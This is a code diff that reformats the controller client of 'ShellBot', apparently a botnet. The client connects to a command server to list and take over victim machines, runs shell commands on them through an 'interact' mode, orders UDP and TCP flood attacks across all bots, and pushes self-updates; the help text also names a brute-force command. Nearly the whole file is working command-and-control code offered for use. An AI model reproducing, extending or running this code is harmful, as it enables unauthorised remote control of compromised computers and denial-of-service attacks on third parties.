@@ -22,10 +22,11 @@
 ## FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
 ## IN THE SOFTWARE.
 
-import subprocess, os, sys, time, threading
-from socket import *
+import os
+import sys
+import socket
 
-intro = """
+intro = r"""
  ____ ____ ____ ____ ____ ____ ____ ____
 ||S |||h |||e |||l |||l |||B |||o |||t ||
 ||__|||__|||__|||__|||__|||__|||__|||__||
@@ -77,86 +78,86 @@ custombruteforce <address>:<port>:<email>:<keys>:<min>:<max>
 
 \n"""
 
-if (len(sys.argv) == 4):
-  host = sys.argv[1]
-  port = int(sys.argv[2])
-  password = sys.argv[3]
+if len(sys.argv) == 4:
+    host = sys.argv[1]
+    port = int(sys.argv[2])
+    password = sys.argv[3]
 else:
-  #sys.exit("Usage: client.py <server ip> <server bridge port> <password>")
-  print("Usage: client.py <server ip> <server bridge port> <password>")
-  host = '127.0.0.1'
-  port = 9090
-  password = '1234'
-  print("Using default values - {}:{}, password:{}".format(host, port, password))
+    #sys.exit("Usage: client.py <server ip> <server bridge port> <password>")
+    print("Usage: client.py <server ip> <server bridge port> <password>")
+    host = '127.0.0.1'
+    port = 9090
+    password = '1234'
+    print("Using default values - {}:{}, password:{}".format(host, port, password))
 
 def main():
-  print(intro)
-  try:
-    s=socket(AF_INET, SOCK_STREAM)
-    s.connect((host,port))
-  except:
-    sys.exit("[ERROR] Can't connect to server")
-
-  s.send(bytes(password, 'utf-8'))
-
-  while 1:
-    command = input("SB> ")
+    print(intro)
     try:
-      if (command == "accept"):
-        s.send(bytes("accept", 'utf-8'))
-        print(s.recv(20480).decode())
-      elif (command == "list"):
-        s.send(bytes("list", 'utf-8'))
-        print(s.recv(20480).decode())
-      elif ("interact " in command):
-        s.send(bytes(command, 'utf-8'))
-        temporary = s.recv(20480).decode()
-        if ("ERROR" not in temporary):
-          victimpath = s.recv(20480).decode()
-          if ("ERROR" not in victimpath):
-            breakit = False
-            while (breakit == False):
-              msg = input(victimpath)
-              allofem = msg.split(";")
-              for onebyone in allofem: #This your happy day one liners
-                if (onebyone == "stop"):
-                  s.send(bytes("stop", 'utf-8'))
-                  print("\n")
-                  breakit = True
-                elif ("cd " in onebyone):
-                  s.send(bytes(onebyone, 'utf-8'))
-                  temp = s.recv(20480).decode()
-                  if ("ERROR" not in temp): victimpath = temp
-                  else: print(temp)
-                elif (onebyone == ""):
-                  print("[CONTROLLER] Nothing to be sent...\n")
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, port))
+    except Exception:
+        sys.exit("[ERROR] Can't connect to server")
+
+    s.send(bytes(password, 'utf-8'))
+
+    while 1:
+        command = input("SB> ")
+        try:
+            if command == "accept":
+                s.send(bytes("accept", 'utf-8'))
+                print(s.recv(20480).decode())
+            elif command == "list":
+                s.send(bytes("list", 'utf-8'))
+                print(s.recv(20480).decode())
+            elif "interact " in command:
+                s.send(bytes(command, 'utf-8'))
+                temporary = s.recv(20480).decode()
+                if "ERROR" not in temporary:
+                    victimpath = s.recv(20480).decode()
+                    if "ERROR" not in victimpath:
+                        breakit = False
+                        while breakit == False:
+                            msg = input(victimpath)
+                            allofem = msg.split(";")
+                            for onebyone in allofem: #This your happy day one liners
+                                if onebyone == "stop":
+                                    s.send(bytes("stop", 'utf-8'))
+                                    print("\n")
+                                    breakit = True
+                                elif "cd " in onebyone:
+                                    s.send(bytes(onebyone, 'utf-8'))
+                                    temp = s.recv(20480).decode()
+                                    if "ERROR" not in temp: victimpath = temp
+                                    else: print(temp)
+                                elif onebyone == "":
+                                    print("[CONTROLLER] Nothing to be sent...\n")
+                                else:
+                                    s.send(bytes(onebyone, 'utf-8'))
+                                    print(s.recv(20480).decode())
+                    else:
+                        print(victimpath)
+                        break
                 else:
-                  s.send(bytes(onebyone, 'utf-8'))
-                  print(s.recv(20480).decode())
-          else:
-            print(victimpath)
-            break
-        else:
-          print(temporary)
-      elif (("udpfloodall " in command) or ("tcpfloodall " in command)):
-        s.send(bytes(command, 'utf-8'))
-        print("\n")
-      elif (command == "selfupdateall"):
-        s.send(bytes("selfupdateall", 'utf-8'))
-        print("\n")   
-      elif(command == "clear"):
-        if sys.platform == 'win32':
-          os.system("cls")
-        else:
-          os.system("clear")
-      elif(command == "quit"):
-        s.send(bytes("quit", 'utf-8'))
-        s.close()
-        break
-      elif(command == "help"):
-        print(commands)
-      elif(command == "credits"):
-        print("""
+                    print(temporary)
+            elif "udpfloodall " in command or "tcpfloodall " in command:
+                s.send(bytes(command, 'utf-8'))
+                print("\n")
+            elif command == "selfupdateall":
+                s.send(bytes("selfupdateall", 'utf-8'))
+                print("\n")
+            elif command == "clear":
+                if sys.platform == 'win32':
+                    os.system("cls")
+                else:
+                    os.system("clear")
+            elif command == "quit":
+                s.send(bytes("quit", 'utf-8'))
+                s.close()
+                break
+            elif command == "help":
+                print(commands)
+            elif command == "credits":
+                print(r"""
  ____ ____ ____ ____ ____ ____ ____ ____
 ||S |||h |||e |||l |||l |||B |||o |||t ||
 ||__|||__|||__|||__|||__|||__|||__|||__||
@@ -166,19 +167,19 @@ Coded by: Sayak Brahmachari
 GitHub: https://github.com/sayak-brm
 Website: http://mctrl.ml
 """)
-      else:
-        print("[CONTROLLER] Invalid Command\n")
-    except KeyboardInterrupt:
-      try:
-        s.send(bytes("quit", 'utf-8'))
-        s.close()
-        print("")
-        break
-      except:
-        pass
-    except Exception as ex:
-      print("[CONTROLLER] Connection Closed Due to Error:", ex)
-      s.close()
-      break
-    
+            else:
+                print("[CONTROLLER] Invalid Command\n")
+        except KeyboardInterrupt:
+            try:
+                s.send(bytes("quit", 'utf-8'))
+                s.close()
+                print("")
+                break
+            except Exception:
+                pass
+        except Exception as ex:
+            print("[CONTROLLER] Connection Closed Due to Error:", ex)
+            s.close()
+            break
+
 main()
